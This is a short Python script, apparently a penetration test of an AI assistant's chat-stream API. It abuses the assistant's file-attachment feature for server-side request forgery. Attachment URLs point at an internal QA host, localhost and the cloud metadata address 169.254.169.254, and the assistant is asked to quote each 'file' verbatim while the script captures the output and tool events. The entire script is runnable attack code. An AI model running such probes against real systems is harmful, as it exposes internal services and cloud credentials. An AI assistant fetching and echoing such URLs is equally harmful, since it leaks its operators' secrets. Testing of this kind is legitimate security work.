import json,subprocess,os,uuid,re
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
CID="conversation::user:231"
def stream(url,fn):
    tag='zx'+uuid.uuid4().hex[:8]
    b={"userMessage":"quote the exact contents of the attached file verbatim","conversationId":CID,
       "context":{"module":{"name":"issues","route":"/workspace/5/issues/issues"},
                  "fileAttachments":[{"id":"1","file_key":tag,"filename":fn,"url":url,"size":100}]}}
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/assistant/chat/stream',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','Accept: text/event-stream','-H','X-Conversation-Id: '+CID,'-d',json.dumps(b)]
    code=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    txt=open('/tmp/b',encoding='utf-8',errors='replace').read()
    chunks=[]
    for line in txt.splitlines():
        try:
            o=json.loads(line)
            if o.get('type')=='text': chunks.append(o['data'].get('chunk',''))
            elif o.get('type')=='tool_executed': chunks.append(f"[TOOL {o['data'].get('tool_name')} {o['data'].get('status')}]")
        except: pass
    return code,''.join(chunks)
targets=[
 ("http://integrations.qa.soxhubapp.com/version","a.pdf"),
 ("http://localhost:3000/version","b.pdf"),
 ("http://169.254.169.254/latest/meta-data/","c.pdf"),
]
for u,fn in targets:
    c,out=stream(u,fn)
    print(f"=== {u}  HTTP {c}")
    print("   ",out[:600].replace(chr(10),' '))
    print()
